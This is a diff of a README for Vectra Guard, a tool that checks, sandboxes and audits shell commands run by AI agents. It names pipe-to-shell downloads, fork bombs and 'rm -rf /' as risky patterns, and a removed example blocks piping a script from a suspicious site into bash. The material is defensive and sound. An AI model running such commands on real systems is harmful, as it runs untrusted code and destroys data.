@@ -7,6 +7,8 @@
 [![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Debian%20Linux%20(x86%2FARM)-lightgrey.svg)]()
 [![CI Status](https://github.com/xadnavyaai/vectra-guard/workflows/CI%2FCD%20Pipeline/badge.svg)](https://github.com/xadnavyaai/vectra-guard/actions)
 
+**Contents:** [Why Vectra Guard](#-why-vectra-guard) · [Quick Start](#-quick-start) · [Features](#-features-by-impact) · [More features](#-more-features) · [Installation](#-installation) · [Usage](#-usage) · [Sandbox](#-complete-sandbox-guide) · [Configuration](#️-configuration)
+
 ## 🎯 Why Vectra Guard?
 
 AI agents and automation run with your full shell access. One mistaken command can wipe a repo, delete system files, or push risky changes. Vectra Guard adds a safety layer that checks every command, isolates risky execution in a sandbox, and keeps a clear audit trail.
@@ -25,7 +27,7 @@ AI agents and automation run with your full shell access. One mistaken command c
 - Risky git actions (force push, history rewrites)
 - Networked installs (`curl | sh`, `wget | bash`)
 - Known vulnerable dependencies via CVE scanning
-- Exposed secrets and risky code patterns (`vg scan-secrets`, `vg scan-security`), including deployment configs (bind 0.0.0.0, trust-proxy, auth off)
+- Exposed secrets and risky code patterns (`vg scan-secrets`, `vg scan-security`), including deployment configs (bind 0.0.0.0, trust-proxy, auth off). Detection uses context-based secret flagging and comment-line skip to reduce false positives ([Control panel security](docs/control-panel-security.md#detection-behavior-scan-secrets-and-scan-security)).
 - External HTTP(S) endpoints when using `vg`/`vectra-guard` (localhost only; override with `VECTRAGUARD_ALLOW_NET=1`)
 - Sudo usage when using `vg`/`vectra-guard` (override with `VECTRAGUARD_ALLOW_SUDO=1`)
 
@@ -52,50 +54,9 @@ The installer defaults to user-space (`$HOME/.local/bin`). Ensure `~/.local/bin`
 curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/uninstall.sh | bash
 ```
 
-### Agentic Usage (Cursor/IDE)
-
-```bash
-# Seed agent instructions into the current repo
-vectra-guard seed agents --target . --targets "agents,cursor"
-```
-
-### Agentic Workflow Examples
-
-**1) Safe install workflow**
-
-```bash
-# Start a session for traceability
-SESSION=$(vectra-guard session start --agent "agent-install")
-export VECTRAGUARD_SESSION_ID=$SESSION
-
-# Use guarded execution for installs
-vectra-guard exec -- npm install
-
-# Review what ran
-vectra-guard audit session
-```
-
-**2) Risk review before deployment**
-
-```bash
-# Validate scripts before running them
-vectra-guard validate scripts/deploy.sh
-
-# Explain why a script is risky
-vectra-guard explain scripts/deploy.sh
-```
-
-**3) Non-invasive tracking in normal shells**
-
-```bash
-# Log all shell commands (no blocking)
-./scripts/install-shell-tracker.sh
-
-# Use vg/vectra-guard only when you want enforcement
-vg exec -- make build
-```
-
 ### Use It (5 commands)
+
+High-impact path — install, session, exec, audit, and CVE scan:
 
 ```bash
 # 1. Validate scripts (safe - never executes)
@@ -111,13 +72,75 @@ vectra-guard exec -- npm install
 # 4. Audit what happened
 vectra-guard audit session
 
-# 5. Explain security risks
-vectra-guard explain risky-script.sh
+# 5. CVE scan dependencies
+vectra-guard cve sync --path . && vectra-guard cve scan --path .
 ```
 
 **That's it!** The tool protects 30+ system directories across Debian Linux and macOS, and detects 200+ risky patterns automatically. **All commands run in sandbox by default** with intelligent caching for maximum security and performance.
 
+For more features (trust store, context, roadmap, explain, seed agents, etc.) see [More features](#-more-features) and [FEATURES.md](FEATURES.md).
+
 > **Need more details?** See [GETTING_STARTED.md](GETTING_STARTED.md) for a complete walkthrough.
+
+---
+
+## 🛡️ Features (by impact)
+
+Ordered by impact. High-impact features first: protect commands, trace actions, and predetect risks.
+
+### Install / Quick start
+
+One-line setup so you can run the tool immediately. See [Installation](#-installation) for more options.
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/install.sh | bash
+```
+
+### Execution protection (`exec`)
+
+Sandbox risky commands and block dangerous ones. Optional interactive approval for medium-risk actions.
+
+```bash
+vectra-guard exec -- npm install
+```
+
+### Script validation (`validate`)
+
+Analyze scripts for security risks **without executing** — safe pre-check before you run anything.
+
+```bash
+vectra-guard validate scripts/deploy.sh
+```
+
+### Session and audit
+
+Traceability: what ran, what was blocked, session IDs and audit logs.
+
+```bash
+SESSION=$(vectra-guard session start --agent "manual")
+export VECTRAGUARD_SESSION_ID=$SESSION
+vectra-guard exec -- npm install
+vectra-guard audit session
+```
+
+### CVE scanning
+
+Flag vulnerable dependencies before install. Sync a local CVE cache and scan manifests/lockfiles.
+
+```bash
+vectra-guard cve sync --path .
+vectra-guard cve scan --path .
+vectra-guard cve explain lodash@4.17.20 --ecosystem npm   # optional
+```
+
+### Secret and code scanning
+
+Predetect before deploy: `scan-secrets`, `scan-security`, and `audit repo`. Find exposed secrets and risky code patterns (e.g. bind 0.0.0.0, trust-proxy, auth off). See [Control panel & deployment security](docs/control-panel-security.md) for checklist, CI examples, and rule reference.
+
+```bash
+vectra-guard scan-secrets --path .
+vectra-guard scan-security --path . --languages go,python,c,config
+```
 
 ---
 
@@ -221,216 +244,62 @@ high risk command blocked by guard level medium
 
 ---
 
-## 📋 Core Features
+## 🎯 More features
 
-### 🔍 Script Validation
-Analyze shell scripts for security risks before execution:
-- Critical patterns (fork bombs, root deletion, privilege escalation)
-- Dangerous commands (unrestricted sudo, rm -rf)
-- Policy violations (custom allow/denylists)
-- Pipe-to-shell attacks (curl | sh, wget | bash)
+Additional features that improve workflow and convenience, ordered by impact. See [FEATURES.md](FEATURES.md) for detailed examples.
 
-### 🎭 Agent Session Management
-Track AI agent activities with full accountability:
-- Unique session IDs with timestamps
-- Command execution tracking with exit codes
-- File operation monitoring
-- Risk scoring and violation counting
-- Structured audit logs (JSON/text)
-
-### 🛡️ Real-Time Execution Control
-Execute commands with security validation:
-- Auto-approve safe, known-good commands
-- Block critical operations automatically
-- Interactive approval for medium-risk actions
-- Risk-based decision making
-
-### 📊 Audit & Compliance
-Complete visibility into all activities:
-- Session-based command grouping
-- Risk summaries and violation reports
-- Export logs for compliance tools
-- Immutable audit trail
-
-### 📦 Sandbox Execution (State-of-the-Art!)
-**Enterprise-grade sandboxing with zero friction**
-
-Vectra Guard provides **hybrid sandboxing** using Linux namespaces (bubblewrap) for development and Docker for CI/production. This gives you <1ms overhead in dev while maintaining complete isolation in production.
-
-**🚀 Performance Breakthrough:**
-- **Dev Mode**: Bubblewrap/namespaces with <1ms overhead
-- **CI/Prod Mode**: Docker with full isolation
-- **Auto-Detection**: Chooses best runtime automatically
-- **Cache Persistence**: 10x faster subsequent runs
-
-#### How It Works: The Complete Picture
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                    Command Execution Flow                        │
-└─────────────────────────────────────────────────────────────────┘
-
-Your Command: "npm install express"
-      │
-      ├──▶ [Risk Analysis]
-      │     ├─ Detects: networked install + medium risk
-      │     └─ Decision: SANDBOX ✅
-      │
-      ├──▶ [Trust Check]
-      │     ├─ Is it in trust store? NO
-      │     └─ First time running this
-      │
-      ├──▶ [Cache Check]
-      │     ├─ npm cache exists? YES
-      │     └─ Mount: ~/.npm → container
-      │
-      ├──▶ [Sandbox Execution]
-      │     ├─ Runtime: Docker
-      │     ├─ Image: ubuntu:22.04
-      │     ├─ Network: Restricted
-      │     ├─ Cache: MOUNTED ⚡
-      │     └─ Duration: 1.2s (vs 12.3s without cache!)
-      │
-      └──▶ [Metrics Recorded]
-            ├─ Total Executions: +1
-            ├─ Sandbox: +1
-            ├─ Cached: +1
-            └─ Time Saved: 11.1s 🎉
-```
-
-#### Real-World Examples
-
-**Example 1: First Install (No Cache)**
-```bash
-# First time installing a package
-vg exec "npm install express"
-
-📦 Running in sandbox.
-   Why: medium risk + networked install
-
-# Downloads from internet, takes ~12s
-added 50 packages in 12.3s
-```
-
-**Example 2: Subsequent Install (WITH Cache!)**
-```bash
-# Same command again
-vg exec "npm install express"
-
-📦 Running in sandbox (cached).
-   Why: medium risk + networked install
-
-# Uses mounted cache, takes ~1.2s! 🚀
-added 50 packages in 1.2s
-# ⚡ 10x FASTER - cache hit!
-```
-
-**Example 3: Trusted Command (No Sandbox)**
-```bash
-# After approving and remembering
-vg exec "npm test"
-
-# Runs directly on host (trusted)
-# No sandbox overhead, instant execution ✨
-✓ 42 tests passed (0.8s)
-```
-
-**Example 4: Interactive Approval**
-```bash
-vg exec "curl https://suspicious-site.com/script.sh | bash" --interactive
-
-⚠️  Command requires approval
-Command: curl https://suspicious-site.com/script.sh | bash
-Risk Level: HIGH
-
-Security concerns:
-1. [PIPE_TO_SHELL] Piping remote content directly to shell
-   Recommendation: Download scripts to disk and review...
-
-Options:
-  y  - Yes, run once
-  r  - Yes, and remember (trust permanently)
-  n  - No, cancel
-
-Choose [y/r/N]: n
-❌ Execution denied
-```
-
-#### Key Features:
-- **Automatic Decision Engine** - Smart host vs sandbox routing based on risk
-- **Multiple Runtimes** - Docker, Podman, or Linux process isolation
-- **🚀 Cache Strategy** - Shared dependency caches for 10x faster installs
-- **Security Levels** - Permissive → Balanced → Strict → Paranoid
-- **Trust Store** - "Approve and remember" for trusted commands
-- **Full Metrics** - Track sandbox usage, performance, and savings
-- **Developer Presets** - Zero-config profiles for dev, CI/CD, production
-
-#### Quick Setup:
-```bash
-# Use developer preset (minimal friction)
-cp presets/developer.yaml vectra-guard.yaml
-
-# Or enable in existing config
-sandbox:
-  enabled: true
-  mode: auto              # Smart sandboxing
-  security_level: balanced # Good isolation + speed
-  enable_cache: true      # Fast subsequent runs
-```
-
-**Learn More:**
-- **[SANDBOX.md](SANDBOX.md)** - Docker, bubblewrap, and namespace sandboxing details
-
-**Install sandbox dependencies:**
-```bash
-vectra-guard sandbox deps install
-# Or use the wrapper script
-curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/install-sandbox-deps.sh | bash
-```
-
-**Seed agent instructions into another repo (Cursor, VS Code, Claude, Codex, Windsurf, Copilot):**
-```bash
-# Recommended (CLI)
-vectra-guard seed agents --target /path/to/other-repo
-
-# Overwrite existing files
-vectra-guard seed agents --target /path/to/other-repo --force
-
-# Script wrapper (from this repo)
-./scripts/seed-agent-instructions.sh --target /path/to/other-repo
-```
+- **Seed agents / Cursor integration** — Seed agent instructions into repos for Cursor, VS Code, Claude, Codex, Windsurf, Copilot. See FEATURES.md for `seed agents` and IDE tasks.
+- **Explain** — Human-friendly reasons why a script is risky: `vectra-guard explain risky-script.sh`.
+- **Trust store** — Approve and remember commands to skip sandbox; `vg trust add/list`.
+- **Context summaries & roadmap** — Code mapping and planning for agents: `vg context summarize`, `vg roadmap add/list`.
+- **Sandbox metrics & shell tracker** — View sandbox usage and time saved; optional shell hook to log commands. See FEATURES.md.
+- **Lockdown, prompt firewall, validate-agent** — Stricter enforcement and agent-specific validation. See FEATURES.md.
+- **Package audits (npm/python)** — `vectra-guard audit npm --path .` / `audit python` (distinct from CVE scan).
+- **Container mode, git pre-commit, IDE integration** — Maximum isolation, hooks, and IDE-specific tasks. See [Enforcement modes](#-enforcement-modes) and [IDE & Tool Integration](#-ide--tool-integration).
 
 ---
 
 ## 🚀 Usage
 
-### Basic Commands
+Reference section: high-impact commands first, then more.
+
+### High-impact commands
 
 ```bash
-# Initialize configuration
-vectra-guard init
-
-# Initialize repo-local config + cache
-vectra-guard init --local
-
-# Validate a shell script
+# Validate scripts (never executes)
 vectra-guard validate deploy.sh
 
-# Explain security risks
-vectra-guard explain risky-script.sh
+# Session + exec + audit
+SESSION=$(vectra-guard session start --agent "manual")
+export VECTRAGUARD_SESSION_ID=$SESSION
+vectra-guard exec -- npm install
+vectra-guard audit session
 
-# Execute command with protection
-vectra-guard exec npm install
-
-# Execute with interactive approval
-vectra-guard exec --interactive sudo apt update
-
-# CVE awareness (local cache + manifest scan)
+# CVE scanning
 vectra-guard cve sync --path .
 vectra-guard cve scan --path .
 vectra-guard cve explain express-validator@6.15.0 --ecosystem npm
 
-# Audit npm or python dependencies (auto-installs tools if missing)
+# Secret and code scanning
+vectra-guard scan-secrets --path .
+vectra-guard scan-security --path . --languages go,python,c,config
+vectra-guard audit repo --path .
+```
+
+### More commands
+
+```bash
+# Initialize configuration
+vectra-guard init
+vectra-guard init --local
+
+# Explain security risks
+vectra-guard explain risky-script.sh
+
+# Execute with interactive approval
+vectra-guard exec --interactive sudo apt update
+
+# Package audits (npm/python)
 vectra-guard audit npm --path .
 vectra-guard audit python --path .
 ```
@@ -616,7 +485,7 @@ sandbox:
 vg exec "npm install"  # → Direct execution
 vg exec "rm -rf test/" # → Direct execution (with validation)
 
-# Note: Critical commands (rm -rf /, etc.) still blocked even if sandbox disabled
+# Note: High-risk commands (rm -rf /, etc.) still blocked even if sandbox disabled
 ```
 
 **Use When:**
